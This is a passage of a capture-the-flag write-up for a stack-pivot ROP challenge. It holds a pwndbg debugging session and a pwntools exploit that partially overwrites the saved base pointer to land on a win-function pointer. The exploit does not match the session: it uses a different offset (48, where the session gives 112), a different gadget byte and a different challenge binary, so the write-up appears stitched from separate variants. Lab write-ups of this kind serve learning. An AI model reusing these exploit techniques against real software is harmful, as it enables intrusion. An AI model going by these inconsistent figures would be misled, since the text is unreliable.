Breakpoint 1 at 0x2207
```

```
pwndbg> run
Starting program: /challenge/pivotal-pursuit-easy 
Downloading separate debug info for system-supplied DSO at 0x7ffe63bd1000
Download failed: Invalid argument.  Continuing without separate debug info for system-supplied DSO at 0x7ffe63bd1000.                                                                                    
Downloading separate debug info for /lib/libcapstone.so.5
Download failed: Invalid argument.  Continuing without separate debug info for /lib/libcapstone.so.5.                                                                                                    
###
### Welcome to /challenge/pivotal-pursuit-easy!
###

This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
challenges, you will become painfully familiar with the concept of Return Oriented Programming!

PIE is turned on! This means that you do not know where any of the gadgets in the main binary are. However, you can do a
partial overwrite of the saved instruction pointer in order to execute 1 gadget! If that saved instruction pointer goes
to libc, you will need to ROP from there. If that saved instruction pointer goes to the main binary, you will need to
ROP from there. You may need need to execute your payload several times to account for the randomness introduced. This
might take anywhere from 0-12 bits of bruteforce depending on the scenario.

In this challenge, a pointer to the win function is stored on the stack.
That pointer is stored at 0x7ffe63b7d120, 8 bytes before your input buffer.
If you can pivot the stack to make the next gadget run be that win function, you will get the flag!

ASLR means that the address of the stack is not known,
but I will simulate a memory disclosure of it.
By knowing where the stack is, you can now reference data
that you write onto the stack.
Be careful: this data could trip up your ROP chain,
because it could be interpreted as return addresses.
You can use gadgets that shift the stack appropriately to avoid that.
[LEAK] Your input buffer is located at: 0x7ffe63b7d128.

The win function has just been dynamically constructed at 0x7f9b23b9e000.

Breakpoint 1, 0x00006111ed113207 in main ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────────────────────────────────────────────────────────────────[ LAST SIGNAL ]─────────────────────────────────────────────────────────────────────────────────────────────
Breakpoint hit at 0x6111ed113207
─────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────────────────────
 RAX  0x7ffe63b7d128 ◂— 0
 RBX  0x6111ed1132c0 (__libc_csu_init) ◂— endbr64
 RCX  0
 RDX  0x1000
 RDI  0
 RSI  0x7ffe63b7d128 ◂— 0
 R8   0x4a
 R9   0x4a
 R10  0x6111ed11484c ◂— 0x6563655200000a2e /* '.\n' */
 R11  0x246
 R12  0x6111ed112240 (_start) ◂— endbr64
 R13  0x7ffe63b7d280 ◂— 1
 R14  0
 R15  0
 RBP  0x7ffe63b7d190 ◂— 0
 RSP  0x7ffe63b7d100 ◂— 0
 RIP  0x6111ed113207 (main+736) ◂— call read@plt
──────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────────────────────────────
 ► 0x6111ed113207 <main+736>    call   read@plt                    <read@plt>
        fd: 0 (/dev/pts/0)
        buf: 0x7ffe63b7d128 ◂— 0
        nbytes: 0x1000
 
   0x6111ed11320c <main+741>    mov    dword ptr [rbp - 0x1c], eax
   0x6111ed11320f <main+744>    mov    eax, dword ptr [rbp - 0x1c]
   0x6111ed113212 <main+747>    cdqe  
   0x6111ed113214 <main+749>    lea    rdx, [rbp - 0x70]
   0x6111ed113218 <main+753>    lea    rcx, [rdx + 8]
   0x6111ed11321c <main+757>    mov    rdx, qword ptr [rip + 0x2e35]     RDX, [rp_]
   0x6111ed113223 <main+764>    sub    rcx, rdx
   0x6111ed113226 <main+767>    mov    rdx, rcx
   0x6111ed113229 <main+770>    add    rax, rdx
   0x6111ed11322c <main+773>    shr    rax, 3
────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp     0x7ffe63b7d100 ◂— 0
01:0008│-088     0x7ffe63b7d108 —▸ 0x7ffe63b7d298 —▸ 0x7ffe63b7d69f ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-080     0x7ffe63b7d110 —▸ 0x7ffe63b7d288 —▸ 0x7ffe63b7d67f ◂— '/challenge/pivotal-pursuit-easy'
03:0018│-078     0x7ffe63b7d118 ◂— 0x100000000
04:0020│-070     0x7ffe63b7d120 —▸ 0x7f9b23b9e000 ◂— push rbp
05:0028│ rax rsi 0x7ffe63b7d128 ◂— 0
... ↓            2 skipped
──────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────
 ► 0   0x6111ed113207 main+736
   1   0x7f9b22962083 __libc_start_main+243
   2   0x6111ed11226e _start+46
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

```
pwndbg> info frame
Stack level 0, frame at 0x7ffe63b7d1a0:
 rip = 0x6111ed113207 in main; saved rip = 0x7f9b22962083
 called by frame at 0x7ffe63b7d270
 Arglist at 0x7ffe63b7d190, args: 
 Locals at 0x7ffe63b7d190, Previous frame's sp is 0x7ffe63b7d1a0
 Saved registers:
  rbp at 0x7ffe63b7d190, rip at 0x7ffe63b7d198
```

- [x] Offset between the location of the buffer and the location of the stored return pointer to `main()`: `112`
   - Location of the buffer: `0x7ffe63b7d128`
   - Location the saved return pointer to `main()`: `0x7ffe63b7d198`
- [ ] LSB of required ROP gadgets
- [ ] Offset of the overwritten stored base pointer value from the buffer

#### ROP gadgets

```
pwndbg> disass main
Dump of assembler code for function main:

# ---- snip ----

   0x00006111ed1132b6 <+911>:   leave
   0x00006111ed1132b7 <+912>:   ret
End of assembler dump.
```

```
pwndbg> x/gx 0x7ffe63b7d198
0x7ffe63b7d198: 0x00007f9b22962083
```

### Exploit

```py 
from pwn import *
context.arch = 'amd64'

# ROP gadgets
leave_lsb = b"\x03"
# Memory addresses and offsets
rip_offset = 48
rbp_offset = rip_offset - 8

p = process('/challenge/pivotal-payload-hard')

# Parse leaks
p.recvuntil(b"buffer is located at: ")
buffer_addr = int(p.recvline().strip().decode().replace('.', ''), 16)

# Pivot logic
# win_ptr is at leak-8. 
# Target RBP at leak-16 makes RSP land on win_ptr after 'pop rbp'.
target_rbp = buffer_addr - 16

# Stable 1-byte pivot payload
payload = flat(
    b"A" * rbp_offset,
    target_rbp,
    leave_lsb
)

p.send(payload)
p.interactive()
```